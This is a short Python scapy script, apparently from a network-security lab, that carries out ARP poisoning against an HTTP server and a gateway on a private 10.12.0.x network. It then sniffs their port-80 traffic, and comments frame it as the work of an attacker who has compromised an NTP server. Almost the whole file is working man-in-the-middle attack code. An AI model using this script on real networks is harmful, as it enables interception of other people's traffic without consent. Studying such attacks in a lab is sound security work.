from scapy.all import *

# Let's say the attacker compormised NTP server and wants to listen to HTTP traffic between the client and the server
# The attacker can use ARP poisoning to intercept the traffic (pretend being the gateway)

internet_gateway_ip = "10.12.0.2"
http_server_ip = "10.12.0.20"
ws_gateway_ip = "10.12.0.1"

# let's find the MAC address of the gateway
ws_gateway_mac = getmacbyip(ws_gateway_ip)
print(ws_gateway_mac)

# let's find the MAC address of the HTTP server
http_server_mac = getmacbyip(http_server_ip)
print(http_server_mac)


# let's send ARP packets to the client and the server to make them think that the attacker is the gateway
arp_packet_to_client = ARP(op=2, pdst=http_server_ip, psrc=ws_gateway_ip, hwdst=http_server_mac)
arp_packet_to_server = ARP(op=2, pdst=ws_gateway_ip, psrc=http_server_ip, hwdst=ws_gateway_mac)

send(arp_packet_to_client)
send(arp_packet_to_server)

# now listen to the traffic
sniff(filter="tcp and port 80", prn=lambda x: x.show())

